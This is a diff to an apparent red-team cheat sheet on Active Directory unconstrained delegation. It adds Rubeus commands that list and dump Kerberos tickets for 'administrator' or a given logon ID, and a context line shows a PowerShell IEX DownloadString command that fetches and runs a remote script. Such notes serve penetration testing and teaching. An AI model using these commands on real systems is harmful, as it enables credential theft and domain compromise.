@@ -1313,6 +1313,8 @@ IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cia
 ##### UNCONSTRAINED DELEGATION RUBEUS - LIST TICKETS
 ```
 .\Rubeus.exe triage
+.\Rubeus.exe triage /user:administrator
+.\Rubeus.exe triage /luid:0xd62d4
 ```
 ```
 Invoke-Rubeus triage
@@ -1327,10 +1329,26 @@ Invoke-Rubeus 'triage'
 ```
 It may be sufficent to just wait and see what privileged or high-interest users/computers authenticate to our compromised host, 
 or it may be possible to force a sensitive system to authenticate through the printerbug.
-##### UNCONSTRAINED DELEGATION RUBEUS - MONITORAR E EXTRAIR OS TICKETS KERBEROS DA MEMÓRIA DO COMPUTADOR:
+##### UNCONSTRAINED DELEGATION RUBEUS - EXPORTAR UM TICKET:
 ```
-aaa
+.\Rubeus.exe dump /nowrap
+.\Rubeus.exe dump /nowrap /user:administrator
+.\Rubeus.exe dump /nowrap /luid:0xd62d4
 ```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
